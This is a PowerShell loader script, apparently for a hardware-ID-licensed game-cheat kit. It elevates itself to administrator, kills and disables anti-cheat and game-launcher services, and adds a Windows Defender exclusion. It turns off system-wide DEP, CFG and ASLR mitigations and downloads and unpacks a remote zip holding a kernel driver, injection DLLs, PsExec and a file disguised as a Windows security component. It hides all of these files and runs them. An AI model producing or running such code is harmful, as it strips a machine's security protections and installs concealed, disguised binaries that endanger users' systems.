
function Test-Admin {
		$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
		$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
		return $currentUser.IsInRole($adminRole)
	}
	if (-not (Test-Admin)) {
		Start-Process powershell -Verb RunAs -ArgumentList ("-File", $MyInvocation.MyCommand.Path)
exit
Clear-Host
}

Function pass {
	Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\' | Where-Object { $_.Start -eq 2 } | Format-Table DisplayName, PSChildName, Start -AutoSize
	$ceState = Get-Service -Name $my_d | Select-Object -ExpandProperty Status
	if ($ceState -eq "Running") {	
	Start-Process $authbat
	Clear-Host
	} else {	
	Stop-Service -Name "+" -Force -ErrorAction SilentlyContinue
	Stop-Process -Name "control.exe" -Force -ErrorAction SilentlyContinue
	Stop-Process -Name "SecurityHealthSystray-x86_64-SSE4-AVX2.exe" -Force -ErrorAction SilentlyContinue
	Clear-Host
	$ceState = Get-Service -Name $ce_d | Select-Object -ExpandProperty Status -ErrorAction SilentlyContinue
	if ($ceState -eq "Running") {
	Stop-Process -Name "cheatengine-x86_64.exe" -Force
	Stop-Process -Name "cheatengine-x86_64-SSE4-AVX2.exe" -Force
	Stop-Service -Name "CEDRIVER73" -Force
	}
	Add-MpPreference -ExclusionPath "$env:TMP\Bytrl"
	Clear-Host
	Set-ProcessMitigation -System -Disable CFG, StrictCFG, SuppressExports
	Set-ProcessMitigation -System -Disable DEP, EmulateAtlThunks
	Set-ProcessMitigation -System -Disable ForceRelocateImages
	Set-ProcessMitigation -System -Disable BottomUp, HighEntropy
	Clear-Host
	Stop-Process -Name "Steam.exe" -Force
	Stop-Process -Name "EasyAntiCheat.exe" -Force
	Stop-Process -Name "EADesktop.exe" -Force
	Clear-Host
	Stop-Service -Name "EasyAntiCheat" -Force
	Stop-Service -Name "Steam Client Service" -Force
	Stop-Service -Name "EABackgroundService" -Force
	Clear-Host
	Set-Service -Name "EasyAntiCheat" -StartupType Demand
	Set-Service -Name "Steam Client Service" -StartupType Demand
	Set-Service -Name "EABackgroundService" -StartupType Demand
	Remove-Item -Path $bin -Recurse -Force
	Clear-Host
	
#WebClient object style
$client = New-Object System.Net.WebClient
$client.DownloadFile($pl1, $binZip)
if (Test-Path $binZip) {Expand-Archive -Path $binZip -DestinationPath $bin}

	Move-Item -Path "$bin\$auth" -Destination "$env:SystemDrive\"
	Clear-Host
				$attributes = @(
					"$env:TMP\wtmpd",
					"$env:TMP\cetrainers",
					"$env:TMP\afolder",
					"$env:TMP\bfcwrk",
					"$env:SystemDrive\PsExec.exe",
					"$bin",
					"$binZip",
					"$normal",
					"$authbat",
					"$maskbat",
					"$bin\autorun",
					"$bin\clibs64",
					"$bin\win64",
					"$bin\allochook-x86_64.dll",
					"$bin\Bytrl.sys",
					"$bin\defines.lua",
					"$bin\libipt-64.dll",
					"$bin\lua53-64.dll",
					"$bin\luaclient-x86_64.dll",
					"$bin\main.lua",
					"$bin\control.exe",
					"$bin\PsExec.exe",
					"$bin\speedhack-x86_64.dll",
					"$bin\unload.exe",
					"$bin\unload+.bat",
					"$bin\vehdebug-x86_64.dll",
					"$bin\vmdisk.img",
					"$bin\winhook-x86_64.dll",
					"$bin\gerye465ye4h4y.exe",
					"$bin\clone.exe",
					"$bin\mask.exe",
					"$bin\hide.exe"
				)
					foreach ($attribute in $attributes) {
						attrib +s +h $attribute
					}
		Clear-Host
	Start-Process $authbat
	}
exit
}
##################################################################################
Function fail {
	Clear-Host
	Write-Host ""
	Write-Host "*Send Me This Key For Authorization!*"
	Write-Host ""
	Write-Host "$hwid"
	Write-Host ""
	Write-Host "Discord: Bytrl"
	Start-Sleep -Seconds 5
	Remove-Item -Path "$env:TMP\bin" -Recurse -Force
	Remove-Item -Path "$env:TMP\cetrainers" -Recurse -Force
	Remove-Item -Path "$env:TMP\afolder" -Recurse -Force
	Remove-Item -Path "$env:TMP\wtmpd" -Recurse -Force
	Remove-Item -Path $binZip -Recurse -Force
	Clear-Host
exit
}
##################################################################################
Function cleanup {
	$attributes = @(
		"$env:TMP\bin",
		"$env:TMP\cetrainers",
		"$env:TMP\afolder",
		"$env:TMP\wtmpd",
		"$env:TMP\Bytrl",
		"$binZip"
	)
	foreach ($attribute in $attributes) {
		Remove-Item -Path $attribute -Recurse -Force
	}
exit
}
##################################################################################
function Get-HardwareID {
    (Get-CimInstance Win32_ComputerSystemProduct).UUID
}
##################################################################################

$dirtyCheck = fsutil dirty query $env:SystemDrive
if ($dirtyCheck -eq "Volume - $env:SystemDrive is dirty") {
    exit
}

$hwid = Get-HardwareID
$link = "https://gist.github.com/Bytrl/894a468f05f7fe7cd2616bdfe6684a3f"
$pl1 = "https://github.com/Bytrl/zips/raw/664eea8ace048e7e9f3a18c3549a83dc23fd3771/bin.zip"
$bin = "$env:TEMP\Bytrl"
$binZip = "$env:SystemDrive\Windows\System32\bin.zip"
$auth = "\PsExec.exe"
$ce_d = "CEDRIVER73"
$my_d = "+"
$authbat = Join-Path $bin "launch-auth.bat"
$maskbat = Join-Path $bin "launch-masked.bat"
$normal = Join-Path $bin "SecurityHealthSystray-x86_64-SSE4-AVX2.exe"
$authFound = $false

foreach ($line in (Invoke-WebRequest -Uri $link).Content -split "`n") {
    if ($line -match $hwid) {
        $authFound = $true
        break
    }
}
if ($authFound) {
    pass
} else {
    fail
}

cleanup


:UACPrompt
	$uacScriptPath = "$env:TEMP\getadmin.vbs"
	echo 'Set UAC = CreateObject("Shell.Application")' | Out-File -FilePath $uacScriptPath -Encoding ASCII
	echo 'UAC.ShellExecute("cmd.exe", "/c $env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe -File $MyInvocation.MyCommand.Path", "", "runas", 1)' | Out-File -FilePath $uacScriptPath -Append -Encoding ASCII
	Start-Process $uacScriptPath -Wait
	Remove-Item -Path $uacScriptPath -Force
	exit /B



